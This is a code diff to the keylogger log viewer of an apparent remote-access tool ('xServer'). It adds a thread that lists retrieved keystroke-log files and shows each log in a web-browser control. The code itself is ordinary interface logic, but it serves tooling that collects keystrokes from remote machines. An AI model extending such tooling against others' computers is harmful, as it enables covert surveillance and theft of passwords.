@@ -4,6 +4,7 @@ using System.IO;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.Misc;
+using System.Threading;
 
 namespace xServer.Forms
 {
@@ -72,6 +73,31 @@ namespace xServer.Forms
             lstLogs.Items.Clear();
 
             new Core.Packets.ServerPackets.GetLogs().Execute(_connectClient);
+
+			new Thread(() =>
+			{
+				while (!btnGetLogs.Enabled)
+				{
+					Thread.Sleep(15);
+				}
+
+				DirectoryInfo dicInfo = new DirectoryInfo(path);
+
+				FileInfo[] iFiles = dicInfo.GetFiles();
+
+				if (iFiles.Length == 0)
+					return;
+
+				foreach (FileInfo file in iFiles)
+				{
+					lstLogs.Invoke((MethodInvoker)delegate
+					{
+						ListViewItem lvi = new ListViewItem();
+						lvi.Text = file.Name;
+						lstLogs.Items.Add(lvi);
+					});
+				}
+			}).Start();
         }
 
         private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
@@ -84,18 +110,7 @@ namespace xServer.Forms
         {
             ListView lv = sender as ListView;
 
-            using (FileStream fileStream = new FileStream(Path.Combine(path, lv.Items[0].SubItems[0].Text), FileMode.Open, FileAccess.Read))
-            {
-                using (StreamReader sr = new StreamReader(fileStream))
-                {
-                    try
-                    {
-                        rtbLogView.Text = sr.ReadToEnd();
-                    }
-                    catch
-                    { }
-                }
-            }
+            wLogViewer.Navigate(Path.Combine(path, lv.Items[0].SubItems[0].Text));
         }
     }
 }
